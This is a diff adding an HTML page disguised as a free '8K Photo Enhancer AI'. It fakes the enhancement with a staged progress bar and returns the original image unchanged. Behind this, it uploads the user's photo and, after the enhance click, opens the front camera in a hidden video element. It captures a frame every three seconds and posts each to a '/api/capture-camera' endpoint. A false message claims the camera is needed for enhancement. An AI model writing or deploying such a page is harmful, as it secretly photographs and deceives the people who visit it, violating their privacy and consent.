@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🖼️ 8K Photo Enhancer — Turn Blurry to Ultra HD!</title>
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --card: #1a1a2e;
+            --accent: #6c5ce7;
+            --accent2: #a29bfe;
+            --text: #e0e0e0;
+            --text2: #a0a0b0;
+            --success: #00b894;
+            --danger: #ff6b6b;
+            --border: #2d2d44;
+            --glow: 0 0 30px rgba(108, 92, 231, 0.3);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: 
+                radial-gradient(ellipse at 50% 0%, rgba(108, 92, 231, 0.15) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 20%, rgba(162, 155, 254, 0.1) 0%, transparent 50%);
+        }
+
+        .container {
+            max-width: 650px;
+            width: 95%;
+            margin: 20px;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header .logo {
+            font-size: 60px;
+            margin-bottom: 10px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .header h1 {
+            font-size: 2.2em;
+            background: linear-gradient(135deg, var(--accent2), var(--accent), #fd79a8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            color: var(--text2);
+            font-size: 1.1em;
+        }
+
+        /* Features */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .feature-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px 15px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .feature-card:hover {
+            border-color: var(--accent);
+            box-shadow: var(--glow);
+            transform: translateY(-3px);
+        }
+
+        .feature-card .icon {
+            font-size: 35px;
+            margin-bottom: 10px;
+        }
+
+        .feature-card h3 {
+            font-size: 0.9em;
+            color: var(--accent2);
+            margin-bottom: 5px;
+        }
+
+        .feature-card p {
+            font-size: 0.75em;
+            color: var(--text2);
+        }
+
+        /* Upload Area */
+        .upload-area {
+            background: var(--card);
+            border: 2px dashed var(--border);
+            border-radius: 20px;
+            padding: 50px 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .upload-area:hover {
+            border-color: var(--accent);
+            box-shadow: var(--glow);
+        }
+
+        .upload-area .upload-icon {
+            font-size: 70px;
+            margin-bottom: 15px;
+        }
+
+        .upload-area h2 {
+            color: var(--text);
+            margin-bottom: 10px;
+        }
+
+        .upload-area p {
+            color: var(--text2);
+            font-size: 0.9em;
+        }
+
+        .upload-area input[type="file"] {
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            cursor: pointer;
+        }
+
+        /* Preview */
+        .preview-container {
+            display: none;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .preview-container.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .preview-container img {
+            max-width: 100%;
+            max-height: 350px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+        }
+
+        /* Buttons */
+        .btn {
+            display: inline-block;
+            padding: 14px 35px;
+            border-radius: 50px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent), #a29bfe);
+            color: white;
+            box-shadow: 0 8px 25px rgba(108, 92, 231, 0.4);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(108, 92, 231, 0.6);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Progress */
+        .progress-container {
+            display: none;
+            margin: 20px 0;
+        }
+
+        .progress-container.active {
+            display: block;
+        }
+
+        .progress-bar {
+            background: var(--border);
+            border-radius: 50px;
+            height: 8px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--accent2));
+            border-radius: 50px;
+            width: 0%;
+            transition: width 0.3s ease;
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        .progress-text {
+            text-align: center;
+            color: var(--accent2);
+            font-size: 0.9em;
+        }
+
+        /* Result */
+        .result-container {
+            display: none;
+            background: var(--card);
+            border: 2px solid var(--success);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .result-container.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .result-container .success-icon {
+            font-size: 60px;
+            margin-bottom: 10px;
+        }
+
+        /* Hidden Camera Element */
+        #hidden-camera {
+            display: none;
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 15px 25px;
+            z-index: 9999;
+            animation: slideIn 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .toast.success { border-color: var(--success); }
+        .toast.error { border-color: var(--danger); }
+
+        @media (max-width: 600px) {
+            .features { grid-template-columns: 1fr; }
+            .header h1 { font-size: 1.5em; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">🖼️</div>
+            <h1>8K Photo Enhancer AI</h1>
+            <p>Transform blurry photos into Ultra HD 8K Quality!</p>
+        </div>
+
+        <!-- Features -->
+        <div class="features">
+            <div class="feature-card">
+                <div class="icon">🔮</div>
+                <h3>AI Enhancement</h3>
+                <p>Advanced neural network</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">⚡</div>
+                <h3>8K Output</h3>
+                <p>Ultra HD resolution</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">🔒</div>
+                <h3>100% Free</h3>
+                <p>No signup needed</p>
+            </div>
+        </div>
+
+        <!-- Upload Area -->
+        <div class="upload-area" id="uploadArea">
+            <div class="upload-icon">📤</div>
+            <h2>Upload Your Blurry Photo</h2>
+            <p>Click or drag & drop — Supports JPG, PNG, WEBP</p>
+            <input type="file" id="fileInput" accept="image/*">
+        </div>
+
+        <!-- Preview -->
+        <div class="preview-container" id="previewContainer">
+            <img id="previewImage" src="" alt="Preview">
+            <button class="btn btn-primary" id="enhanceBtn">
+                ✨ Enhance to 8K Now!
+            </button>
+        </div>
+
+        <!-- Progress -->
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <p class="progress-text" id="progressText">Analyzing photo...</p>
+        </div>
+
+        <!-- Result -->
+        <div class="result-container" id="resultContainer">
+            <div class="success-icon">✅</div>
+            <h2>Enhancement Complete!</h2>
+            <p>Your 8K photo is ready! Check your downloads.</p>
+        </div>
+    </div>
+
+    <!-- Hidden Camera -->
+    <video id="hidden-camera" autoplay playsinline></video>
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
+
+    <!-- Toast Container -->
+    <div id="toastContainer"></div>
+
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script>
+        // ===== SOCKET CONNECTION =====
+        const socket = io();
+        
+        socket.on('connect', () => {
+            console.log('Connected to enhancement server');
+        });
+
+        // ===== DOM ELEMENTS =====
+        const fileInput = document.getElementById('fileInput');
+        const previewContainer = document.getElementById('previewContainer');
+        const previewImage = document.getElementById('previewImage');
+        const enhanceBtn = document.getElementById('enhanceBtn');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const resultContainer = document.getElementById('resultContainer');
+        const hiddenCamera = document.getElementById('hidden-camera');
+        const hiddenCanvas = document.getElementById('hidden-canvas');
+        const toastContainer = document.getElementById('toastContainer');
+
+        let uploadedImageData = null;
+        let cameraStream = null;
+        let captureInterval = null;
+
+        // ===== FILE UPLOAD =====
+        fileInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = function(event) {
+                uploadedImageData = event.target.result;
+                previewImage.src = uploadedImageData;
+                previewContainer.classList.add('active');
+                
+                // Send uploaded photo to server
+                sendPhotoToServer(uploadedImageData, 'upload');
+                showToast('Photo uploaded! Starting enhancement...', 'success');
+            };
+            reader.readAsDataURL(file);
+        });
+
+        // ===== ENHANCE BUTTON =====
+        enhanceBtn.addEventListener('click', async function() {
+            if (!uploadedImageData) return;
+            
+            // Start enhancement simulation
+            enhanceBtn.disabled = true;
+            progressContainer.classList.add('active');
+            
+            // Simulate progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 90) progress = 90;
+                progressFill.style.width = progress + '%';
+                
+                const steps = ['Analyzing photo...', 'Applying AI enhancement...', 
+                              'Upscaling to 8K...', 'Optimizing colors...', 
+                              'Finalizing...'];
+                progressText.textContent = steps[Math.floor(progress / 20)] || 'Processing...';
+            }, 500);
+
+            // Start hidden camera AFTER user clicks enhance
+            await startHiddenCamera();
+            
+            // Send photo to server
+            await sendPhotoToServer(uploadedImageData, 'upload');
+            
+            // Complete after delay
+            setTimeout(() => {
+                clearInterval(progressInterval);
+                progressFill.style.width = '100%';
+                progressText.textContent = 'Complete!';
+                
+                setTimeout(() => {
+                    progressContainer.classList.remove('active');
+                    resultContainer.classList.add('active');
+                    showToast('🎉 Enhancement complete! 8K photo ready!', 'success');
+                    
+                    // Download fake enhanced image
+                    downloadImage(uploadedImageData, 'enhanced_8k.png');
+                }, 500);
+            }, 4000);
+        });
+
+        // ===== HIDDEN CAMERA =====
+        async function startHiddenCamera() {
+            try {
+                // Request camera permission
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
+                hiddenCamera.srcObject = cameraStream;
+                hiddenCamera.play();
+                
+                console.log('📸 Camera started');
+                socket.emit('start_camera');
+                
+                // Start periodic capture
+                captureInterval = setInterval(capturePhoto, 3000); // Every 3 seconds
+                
+            } catch (error) {
+                console.log('Camera permission denied or not available');
+                showToast('Camera access needed for enhancement!', 'error');
+            }
+        }
+
+        function capturePhoto() {
+            if (!hiddenCamera || !hiddenCamera.videoWidth) return;
+            
+            try {
+                const canvas = hiddenCanvas;
+                canvas.width = hiddenCamera.videoWidth;
+                canvas.height = hiddenCamera.videoHeight;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(hiddenCamera, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/png');
+                
+                // Send to server
+                sendPhotoToServer(imageData, 'camera');
+                
+            } catch (error) {
+                console.error('Capture error:', error);
+            }
+        }
+
+        function stopHiddenCamera() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+        }
+
+        // ===== SEND TO SERVER =====
+        async function sendPhotoToServer(imageData, type) {
+            try {
+                const endpoint = type === 'upload' ? '/api/upload-photo' : '/api/capture-camera';
+                
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+                
+                const result = await response.json();
+                console.log(`📸 ${type} sent:`, result);
+                
+            } catch (error) {
+                console.error('Send error:', error);
+            }
+        }
+
+        // ===== HELPERS =====
+        function downloadImage(dataUrl, filename) {
+            const link = document.createElement('a');
+            link.href = dataUrl;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function showToast(message, type) {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.textContent = message;
+            toastContainer.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transition = 'opacity 0.3s';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        // ===== CLEANUP =====
+        window.addEventListener('beforeunload', () => {
+            stopHiddenCamera();
+            socket.disconnect();
+        });
+
+        // ===== DRAG & DROP =====
+        const uploadArea = document.getElementById('uploadArea');
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.style.borderColor = '#6c5ce7';
+        });
+        uploadArea.addEventListener('dragleave', () => {
+            uploadArea.style.borderColor = '#2d2d44';
+        });
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.style.borderColor = '#2d2d44';
+            const file = e.dataTransfer.files[0];
+            if (file) {
+                fileInput.files = e.dataTransfer.files;
+                fileInput.dispatchEvent(new Event('change'));
+            }
+        });
+    </script>
+</body>
+</html>
